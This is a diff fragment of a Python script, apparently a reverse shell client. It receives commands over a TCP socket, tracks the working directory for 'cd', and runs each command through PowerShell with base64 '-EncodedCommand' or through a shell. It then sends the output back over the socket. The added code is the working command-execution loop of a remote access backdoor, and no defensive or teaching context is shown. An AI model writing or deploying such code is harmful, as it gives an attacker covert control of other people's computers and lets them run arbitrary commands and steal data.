@@ -67,3 +67,43 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     if new_path == "..":
                         cwd = os.path.dirname(cwd)
                     else:
+                        combined = os.path.abspath(os.path.join(cwd, new_path))
+                        if os.path.isdir(combined):
+                            cwd = combined
+                        else:
+                            raise FileNotFoundError(f"The system cannot find the path specified: {combined}")
+                prompt = get_prompt()
+                s.sendall(prompt.encode())
+                continue
+
+            # Run command in tracked directory
+            if mode == "ps":
+                encoded_cmd = encode_powershell_command(command)
+                output = subprocess.check_output(
+                    ["powershell.exe", "-NoProfile", "-EncodedCommand", encoded_cmd],
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    cwd=cwd
+                )
+            else:
+                output = subprocess.check_output(
+                    command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    cwd=cwd
+                )
+
+            prompt = get_prompt()
+
+            # Send prompt and output separately so no duplicate command echoes:
+            full_output = f"{prompt}\n{output}"
+
+        except subprocess.CalledProcessError as e:
+            prompt = get_prompt()
+            full_output = f"{prompt}\n{e.output}"
+        except FileNotFoundError as e:
+            prompt = get_prompt()
+            full_output = f"{prompt}\n{str(e)}"
+
+        s.sendall(full_output.encode())
